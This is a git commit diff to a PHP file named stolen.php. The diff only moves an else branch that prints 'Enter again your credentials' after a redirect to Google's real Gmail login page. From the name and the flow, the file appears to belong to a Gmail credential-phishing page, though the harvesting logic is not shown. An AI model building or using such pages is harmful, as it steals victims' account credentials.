93adc958964191d2d37d14310fe55b9e88cd5196
MavroidisV <mavroidis@hotmail.gr>
2016-07-09 18:05:34 +0100

    Update stolen.php

--- stolen.php
+++ stolen.php
@@ -16,8 +16,9 @@ if(isset($_POST["submit"]))
             header("url=https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1#identifier");
 
         }
-    else echo "Enter again your credentials";
+
 
     
 }
+    else echo "Enter again your credentials";
 ?>
